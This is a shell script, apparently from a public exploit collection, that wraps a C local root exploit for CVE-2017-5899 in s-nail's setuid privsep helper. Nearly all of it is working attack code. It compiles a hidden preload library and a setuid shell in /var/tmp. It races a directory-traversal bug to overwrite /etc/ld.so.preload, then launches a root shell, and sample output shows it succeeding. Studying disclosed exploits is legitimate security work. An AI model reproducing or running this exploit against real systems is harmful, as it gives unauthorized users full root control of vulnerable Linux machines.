#!/bin/sh
# Wrapper for @wapiflapi's s-nail-privget.c local root exploit for CVE-2017-5899
# uses ld.so.preload technique
# ---
# [~] Found privsep: /usr/lib/s-nail/s-nail-privsep
# [.] Compiling /var/tmp/.snail.so.c ...
# [.] Compiling /var/tmp/.sh.c ...
# [.] Compiling /var/tmp/.privget.c ...
# [.] Adding /var/tmp/.snail.so to /etc/ld.so.preload ...
# [=] s-nail-privsep local root by @wapiflapi
# [.] Started flood in /etc/ld.so.preload
# [.] Started race with /usr/lib/s-nail/s-nail-privsep
# [.] This could take a while...
# [.] Race #1 of 1000 ...
# This is a helper program of "s-nail" (in /usr/bin).
#   It is capable of gaining more privileges than "s-nail"
#   and will be used to create lock files.
#   It's sole purpose is outsourcing of high privileges into
#   fewest lines of code in order to reduce attack surface.
#   It cannot be run by itself.
# [.] Race #2 of 1000 ...
# ...
# ...
# ...
# [.] Race #9 of 1000 ...
# [+] got root! /var/tmp/.sh (uid=0 gid=0)
# [.] Cleaning up...
# [+] Success:
# -rwsr-xr-x 1 root root 6336 Jan 13 20:42 /var/tmp/.sh
# [.] Launching root shell: /var/tmp/.sh
# # id
# uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(test)
# ---
# <bcoles@gmail.com>
# https://github.com/bcoles/local-exploits/tree/master/CVE-2017-5899

base_dir="/var/tmp"
rootshell="${base_dir}/.sh"
privget="${base_dir}/.privget"
lib="${base_dir}/.snail.so"

if test -u "${1}"; then
  privsep_path="${1}"
elif test -u /usr/lib/s-nail/s-nail-privsep; then
  privsep_path="/usr/lib/s-nail/s-nail-privsep"
elif test -u /usr/lib/mail-privsep; then
  privsep_path="/usr/lib/mail-privsep"
else
  echo "[-] Could not find privsep path"
  exit 1
fi
echo "[~] Found privsep: ${privsep_path}"

if ! test -w "${base_dir}"; then
  echo "[-] ${base_dir} is not writable"
  exit 1
fi

echo "[.] Compiling ${lib}.c ..."

cat << EOF > "${lib}.c"
#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>

void init(void) __attribute__((constructor));                                                             

void __attribute__((constructor)) init() {
  if (setuid(0) || setgid(0))
    _exit(1);

  unlink("/etc/ld.so.preload");

  chown("${rootshell}", 0, 0);
  chmod("${rootshell}", 04755);
  _exit(0);
}
EOF

if ! gcc "${lib}.c" -fPIC -Wall -shared -s -o "${lib}"; then
  echo "[-] Compiling ${lib}.c failed"
  exit 1
fi

/bin/rm "${lib}.c"

echo "[.] Compiling ${rootshell}.c ..."

cat << EOF > "${rootshell}.c"
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0);
  setgid(0);
  execl("/bin/sh", "sh", NULL);
}
EOF

if ! gcc "${rootshell}.c" -fPIC -Wall -s -o "${rootshell}"; then
  echo "[-] Compiling ${rootshell}.c failed"
  exit 1
fi

/bin/rm "${rootshell}.c"

cat << EOF > "${privget}.c"
/*
** 26/01/2016: s-nail-privsep local root by @wapiflapi
** The setuid s-nail-privsep binary has a directory traversal bug.
** This lets us be owner of a file at any location root can give us one,
** only for a very short time though. So we have to race a bit :-)
** Here we abuse the vuln by creating a polkit policy letting us call pkexec su.
**
** gcc s-nail-privget.c -o s-nail-privget
**
** # for ubuntu:
** ./s-nail-privget /usr/lib/s-nail/s-nail-privsep
** # for archlinux:
** ./s-nail-privget /usr/lib/mail-privsep
** ---
** Original exploit: https://www.openwall.com/lists/oss-security/2017/01/27/7/1
** Updated by <bcoles@gmail.com> to use ldpreload technique
** https://github.com/bcoles/local-exploits/tree/master/CVE-2017-5899
*/

#define _GNU_SOURCE

#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>

#define DEBUG

#ifdef DEBUG
#  define dprintf printf
#else
#  define dprintf
#endif

#define ROOTSHELL "${rootshell}"
#define ITERATIONS 1000

/*
** Attempts to copy data to target quickly...
*/
static pid_t flood(char const *target, char const *data, size_t len) {
  pid_t child;

  if ((child = fork()) != 0)
    return child;

  if (nice(-20) < 0) {
    dprintf("[!] Failed to set niceness");
  }

  while (1) {
    int fd;

    if ((fd = open(target, O_WRONLY)) < 0) {
      continue;
    }

    write(fd, data, len);
    close(fd);

    usleep(10);
  }

  return child;
}

/*
** This triggers the vulnerability. (a lot.)
*/
static pid_t race(char const *path, char const *target) {
  pid_t child;

  if ((child = fork()) != 0)
    return child;

  char *argv[] = {
    NULL, "rdotlock",
    "mailbox",	NULL, // \$TMPDIR/foo
    "name",	NULL, // \$TMPDIR/foo.lock
    "hostname",	"spam",
    "randstr",	NULL, // eggs/../../../../../../..\$TARGET
    "pollmsecs","0",
    NULL
  };

  char tmpdir[] = "/tmp/tmpdir.XXXXXX";
  char *loldir;

  int fd, pid, inpipe[2], outpipe[2];

  if (!mkdtemp(tmpdir)) {
    dprintf("[-] mkdtemp(%s)", tmpdir);
    exit(EXIT_FAILURE);
  }

  if (!(argv[0] = strrchr(path, '/'))) {
    dprintf("[-] %s is not full path to privsep.", path);
    exit(EXIT_FAILURE);
  }
  argv[0] += 1; // skip '/'.

  // (nope I'm not going to free those later.)
  if (asprintf(&loldir, "%s/foo.lock.spam.eggs", tmpdir) < 0 ||
      asprintf(&argv[3], "%s/foo", tmpdir) < 0 ||
      asprintf(&argv[5], "%s/foo.lock", tmpdir) < 0 ||
      asprintf(&argv[9], "eggs/../../../../../../..%s", target) < 0) {
    dprintf("[-] asprintf() failed\n");
    exit(EXIT_FAILURE);
  }

  // touch \$tmpdir/foo
  if ((fd = open(argv[3], O_WRONLY | O_CREAT, 0640)) < 0) {
    dprintf("[-] open(%s) failed\n", argv[3]);
    exit(EXIT_FAILURE);
  }
  close(fd);

  // mkdir \$tmpdir/foo.lock.spam.eggs
  if (mkdir(loldir, 0755) < 0) {
    dprintf("[-] mkdir(%s) failed\n", loldir);
    exit(EXIT_FAILURE);
  }

  // OK, done setting up the environment & args.
  // Setup some pipes and let's get going.
  if (pipe(inpipe) < 0 || pipe(outpipe) < 0) {
    dprintf("[-] pipe() failed\n");
    exit(EXIT_FAILURE);
  }

  close(inpipe[1]);
  close(outpipe[0]);

  while (1) {
    if ((pid = fork()) < 0) {
      dprintf("[!] fork failed\n");
      continue;
    } else if (pid) {
      waitpid(pid, NULL, 0);
      continue;
    }

    // This is the child, give it the pipes it wants. (-_-')
    if (dup2(inpipe[0], 0) < 0 || dup2(outpipe[1], 1) < 0) {
      dprintf("[-] dup2() failed\n");
      exit(EXIT_FAILURE);
    }

    if (nice(20) < 0) {
      dprintf("[!] Failed to set niceness");
    }

    execv(path, argv);
    dprintf("[-] execve(%s) failed\n", path);
    exit(EXIT_FAILURE);
  }

  return child;
}

int main(int argc, char **argv, char **envv) {
  char payload[] = "${lib}";
  char const *target = "/etc/ld.so.preload";
  char const *privsep_path = argv[1];
  pid_t flood_pid, race_pid;
  struct stat st;

  if (argc != 2) {
    dprintf("usage: %s /full/path/to/privsep\n", argv[0]);
    exit(EXIT_FAILURE);
  }

  lstat(privsep_path, &st);

  if ((long)st.st_uid != 0) {
    dprintf("[-] privsep path is not valid: %s\n", privsep_path);
    exit(EXIT_FAILURE);
  }

  dprintf("[=] s-nail-privsep local root by @wapiflapi\n");

  if ((flood_pid = flood(target, payload, sizeof payload)) == -1) {
    dprintf("[-] flood() failed\n");
    exit(EXIT_FAILURE);
  }

  dprintf("[.] Started flood in %s\n", target);

  if ((race_pid = race(privsep_path, target)) == -1) {
    dprintf("[-] race() failed\n");
    exit(EXIT_FAILURE);
  }

  dprintf("[.] Started race with %s\n", privsep_path);
  dprintf("[.] This could take a while...\n");

  for (int i = 1; i <= ITERATIONS; i++) {
    dprintf("[.] Race #%d of %d ...\n", i, ITERATIONS);
    system(privsep_path);
    lstat(ROOTSHELL, &st);
    if ((long)st.st_uid == 0)
      break;
  }

  kill(race_pid, SIGKILL);
  kill(flood_pid, SIGKILL);

  if ((long)st.st_uid != 0) {
    dprintf("[-] Failed. Not vulnerable?\n");
    exit(EXIT_FAILURE);
  }
  dprintf("[+] got root! %s (uid=%ld gid=%ld)\n", ROOTSHELL, (long)st.st_uid, (long)st.st_gid);

  return system(ROOTSHELL);
}
EOF

echo "[.] Compiling ${privget}.c ..."

if ! gcc "${privget}.c" -fPIC -Wall -s -o "${privget}"; then
  echo "[-] Compiling ${privget}.c failed"
  exit 1
fi

/bin/rm "${privget}.c"

echo "[.] Adding ${lib} to /etc/ld.so.preload ..."

echo | $privget "${privsep_path}"

echo '[.] Cleaning up...'

/bin/rm "${privget}"
/bin/rm "${lib}"

if ! test -u "${rootshell}"; then
  echo '[-] Failed'
  /bin/rm "${rootshell}"
  exit 1
fi

echo '[+] Success:'
/bin/ls -la "${rootshell}"

echo "[.] Launching root shell: ${rootshell}"
$rootshell
